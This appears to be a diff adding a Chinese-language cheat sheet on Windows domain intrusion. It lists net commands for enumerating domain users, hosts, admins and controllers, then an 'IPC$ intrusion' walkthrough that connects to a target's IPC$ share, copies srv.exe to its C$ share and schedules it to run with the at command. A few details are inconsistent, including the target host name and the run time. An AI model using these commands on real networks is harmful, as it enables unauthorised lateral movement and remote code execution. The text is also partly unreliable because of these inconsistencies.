@@ -1,0 +1,19 @@
+net user /domain：查看域用户。
+net view /domain：查看有几个域。
+net view /domain:XXX：查看域内的主机。
+net group /domain：查看域里面的组。
+net group “domain computers” /domain：查看域内所有的主机名。
+net group “domain admins” /domain：查看域管理员。
+net group “domain controllers” /domain：查看域控制器。
+net group “enterprise admins” /domain：查看企业管理组。
+nettime/domain：查看时间服务器。
+
+IPC$入侵，即通过使用Windows系统中默认启动的IPC$共享获得计算机控制权的入侵，在内网中极其常见。
+假设现在有一台IPC$主机：127.0.0.25，输入以下命令。
+net use \\127.0.0.25\ipc$      #连接127.0.0.25的IPC$共享
+copy srv.exe \\hacden-pc\c$    #复制srv.exe到目标c盘上去
+net time \127.0.0.25         #查时间
+at \\127.0.0.25 10:50 srv.exe  #用at命令在0点50分启动srv.exe（注意这里设置的时间要比主机时间快）
+at \\127.0.0.25 10:50 "echo 5 > c:\t.txt" 在远程计算机上建立文本文件t.txt； 
+
+
